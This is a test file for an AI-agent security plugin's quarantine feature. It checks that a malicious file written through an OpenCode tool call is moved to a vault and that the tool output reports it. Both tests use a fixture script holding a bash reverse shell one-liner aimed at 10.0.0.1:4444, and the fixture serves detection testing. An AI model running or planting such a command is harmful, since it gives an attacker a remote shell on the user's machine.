/**
 * OpenCode `tool.execute.after` wiring of the file quarantine (item 69): a
 * malicious file the call wrote is moved into the vault and the model-visible
 * output says so.
 */

import { existsSync, mkdirSync, writeFileSync } from "node:fs";
import { rm } from "node:fs/promises";
import { join, resolve } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { makeTmpDir } from "../../../core/src/__tests__/test-utils.js";
import { createOutputHandlers } from "../output-handler.js";

vi.mock("../bundled-dirs.js", () => ({
	getBundledDataDirs: () => ({
		pluginDir: "",
		packageRoot: "",
		threatsDir: resolve(__dirname, "..", "..", "..", "..", "threats"),
		allowlistsDir: resolve(__dirname, "..", "..", "..", "..", "allowlists"),
	}),
	getAidrVersion: () => "0.0.0",
}));

let homeDir: string;

beforeEach(async () => {
	homeDir = await makeTmpDir();
	vi.stubEnv("HOME", homeDir);
	vi.stubEnv("USERPROFILE", homeDir);
});

afterEach(async () => {
	vi.unstubAllEnvs();
	await rm(homeDir, { recursive: true, force: true });
});

function logger() {
	return { debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() };
}

describe("OpenCode file quarantine", () => {
	it("moves a malicious written file into the vault and appends the notice", async () => {
		mkdirSync(join(homeDir, ".singularity-aidr"), { recursive: true });
		writeFileSync(
			join(homeDir, ".singularity-aidr", "config.json"),
			JSON.stringify({ response: { quarantine: { enabled: true } } }),
		);
		const path = join(homeDir, "evil.sh");
		writeFileSync(path, "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n");
		const output = { title: "write", output: "Wrote file successfully.", metadata: {} };
		await createOutputHandlers(logger())["tool.execute.after"](
			{ tool: "write", sessionID: "s1", callID: "c1", args: { filePath: path } },
			output,
		);
		expect(existsSync(path)).toBe(false);
		expect(output.output).toContain("Wrote file successfully.");
		expect(output.output).toContain("quarantined");
	});

	it("leaves the file and the output alone while quarantine is off", async () => {
		const path = join(homeDir, "evil.sh");
		writeFileSync(path, "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n");
		const output = { title: "write", output: "Wrote file successfully.", metadata: {} };
		await createOutputHandlers(logger())["tool.execute.after"](
			{ tool: "write", sessionID: "s1", callID: "c1", args: { filePath: path } },
			output,
		);
		expect(existsSync(path)).toBe(true);
		expect(output.output).toBe("Wrote file successfully.");
	});
});
